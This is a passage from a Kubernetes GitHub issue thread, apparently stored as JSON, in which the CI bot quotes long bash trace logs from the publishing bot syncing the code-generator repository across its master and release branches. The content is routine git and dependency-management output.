'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' did not match any file(s) known to git.\n>    \tgodep: error restoring dep (k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1beta1): exit status 1\n>    \t# cd /go-workspace/src/k8s.io/apiextensions-apiserver; git checkout xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n>    \terror: pathspec 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' did not match any file(s) known to git.\n>    \tgodep: error restoring dep (k8s.io/apiextensions-apiserver/pkg/client/clientset/clientset/scheme): exit status 1\n>    \tgodep: Error restoring some deps. Aborting check.\n>\n>[19 Sep 18 10:13 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-424981632):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>[27 Sep 18 07:04 UTC]: Successfully ensured /go-workspace/src/k8s.io/code-generator exists\n>[27 Sep 18 07:04 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[27 Sep 18 07:04 UTC]: /publish_scripts/construct.sh code-generator master master   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  dbba1a5384891d2ed25600a9505ec1ff58993795\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=dbba1a5384891d2ed25600a9505ec1ff58993795\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=3fe21e5433988b9512e74f42bf07a036be84a263\n>\t+ '[' 3fe21e5433988b9512e74f42bf07a036be84a263 '!=' dbba1a5384891d2ed25600a9505ec1ff58993795 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''dbba1a5384891d2ed25600a9505ec1ff58993795'\\'' to '\\''3fe21e5433988b9512e74f42bf07a036be84a263'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'dbba1a5384891d2ed25600a9505ec1ff58993795' to '3fe21e5433988b9512e74f42bf07a036be84a263'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator master master '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 15 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 731fd61190482fe9e4b67e30ccb8596966f394dd.\n>\t+ echo 'Starting at existing master commit 731fd61190482fe9e4b67e30ccb8596966f394dd.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 3fe21e5433988b9512e74f42bf07a036be84a263.\n>\t+ echo 'Checked out source commit 3fe21e5433988b9512e74f42bf07a036be84a263.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\t+ '[' -z a67689dfcab0ed547e1d060c414eae7c81629cc9 ']'\n>\t++ git-find-merge a67689dfcab0ed547e1d060c414eae7c81629cc9 upstream/master\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'a67689dfcab0ed547e1d060c414eae7c81629cc9^1..upstream/master' --first-parent\n>\t+++ git rev-list a67689dfcab0ed547e1d060c414eae7c81629cc9..upstream/master --ancestry-path\n>\t+++ git rev-parse a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\t+ local k_base_merge=a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\t+ '[' -z a67689dfcab0ed547e1d060c414eae7c81629cc9 ']'\n>\t+ git branch -f filtered-branch-base a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\tRunning git filter-branch ...\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=4756583f613a01fd2dea608e18d4a6ab79ef8e51\n>\t++ git log --first-parent --format=%H --reverse 4756583f613a01fd2dea608e18d4a6ab79ef8e51..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\tChecking out branch master.\n>\t+ git checkout -q master\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 731fd61190482fe9e4b67e30ccb8596966f394dd '!=' 731fd61190482fe9e4b67e30ccb8596966f394dd ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\t+ '[' -z a67689dfcab0ed547e1d060c414eae7c81629cc9 ']'\n>\t++ git-find-merge a67689dfcab0ed547e1d060c414eae7c81629cc9 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'a67689dfcab0ed547e1d060c414eae7c81629cc9^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a67689dfcab0ed547e1d060c414eae7c81629cc9..upstream-branch --ancestry-path\n>\t+++ git rev-parse a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\t+ local k_last_kube_merge=a67689dfcab0ed547e1d060c414eae7c81629cc9\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 731fd61190482fe9e4b67e30ccb8596966f394dd\n>\tRemove redundant godep commits on-top of 731fd61190482fe9e4b67e30ccb8596966f394dd.\n>\t+ echo 'Remove redundant godep commits on-top of 731fd61190482fe9e4b67e30ccb8596966f394dd.'\n>\t+ git reset --soft -q 731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ local repo=code-generator\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master\n>\t+ '[' -n '731fd61 Merge pull request #68245 from jingyih/remove_tagName_in_goDoc' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-code-generator-master.sh --dependencies '' --mapping-output-file '../tag-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse master\n>\t+ '[' 731fd61190482fe9e4b67e30ccb8596966f394dd '!=' 731fd61190482fe9e4b67e30ccb8596966f394dd ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[27 Sep 18 07:05 UTC]: Successfully constructed master\n>[27 Sep 18 07:05 UTC]: /publish_scripts/construct.sh code-generator release-1.9 release-1.9   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f38511d3672e59a02aba29712bfc0aab9a0cbdee\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.9\n>\t+ DST_BRANCH=release-1.9\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f38511d3672e59a02aba29712bfc0aab9a0cbdee\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\t+ echo 'Cleaning up checkout.'\n>\tCleaning up checkout.\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 731fd61190482fe9e4b67e30ccb8596966f394dd\n>\t+ git branch -D release-1.9\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.9\n>\tSwitching to origin/release-1.9.\n>\t+ echo 'Switching to origin/release-1.9.'\n>\t+ git branch -f release-1.9 origin/release-1.9\n>\t+ git checkout -q release-1.9\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.9\n>\t+ UPSTREAM_HASH=f38511d3672e59a02aba29712bfc0aab9a0cbdee\n>\t+ '[' f38511d3672e59a02aba29712bfc0aab9a0cbdee '!=' f38511d3672e59a02aba29712bfc0aab9a0cbdee ']'\n>\t+ echo 'Skipping sync because upstream/release-1.9 at f38511d3672e59a02aba29712bfc0aab9a0cbdee did not change since last sync.'\n>\tSkipping sync because upstream/release-1.9 at f38511d3672e59a02aba29712bfc0aab9a0cbdee did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.9\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=0ab89e584187c20cc7c1a3f30db69f3b4ab64196\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.9.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.9.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.9 --push-script ../push-tags-code-generator-release-1.9.sh --dependencies '' --mapping-output-file '../tag-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.9\n>\t+ '[' 0ab89e584187c20cc7c1a3f30db69f3b4ab64196 '!=' 0ab89e584187c20cc7c1a3f30db69f3b4ab64196 ']'\n>\t+ git checkout release-1.9\n>\tAlready on 'release-1.9'\n>\tYour branch is up-to-date with 'origin/release-1.9'.\n>[27 Sep 18 07:05 UTC]: Successfully constructed release-1.9\n>[27 Sep 18 07:05 UTC]: /publish_scripts/construct.sh code-generator release-1.10 release-1.10   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  6b64246e2588d1594664e1e83c72735acd279d26\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-1.10\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=6b64246e2588d1594664e1e83c72735acd279d26\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tCleaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 0ab89e584187c20cc7c1a3f30db69f3b4ab64196\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\tSwitching to origin/release-1.10.\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ git branch -f release-1.10 origin/release-1.10\n>\t+ git checkout -q release-1.10\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\tSkipping sync because upstream/release-1.10 at 6b64246e2588d1594664e1e83c72735acd279d26 did not change since last sync.\n>\t+ UPSTREAM_HASH=6b64246e2588d1594664e1e83c72735acd279d26\n>\t+ '[' 6b64246e2588d1594664e1e83c72735acd279d26 '!=' 6b64246e2588d1594664e1e83c72735acd279d26 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.10 at 6b64246e2588d1594664e1e83c72735acd279d26 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-code-generator-release-1.10.sh --dependencies '' --mapping-output-file '../tag-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' 9de8e796a74d16d2a285165727d04c185ebca6dc '!=' 9de8e796a74d16d2a285165727d04c185ebca6dc ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[27 Sep 18 07:05 UTC]: Successfully constructed release-1.10\n>[27 Sep 18 07:05 UTC]: /publish_scripts/construct.sh code-generator release-1.11 release-1.11   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  50ea2c8ec8368591869faf635cec41244d475cd0\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=50ea2c8ec8368591869faf635cec41244d475cd0\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc 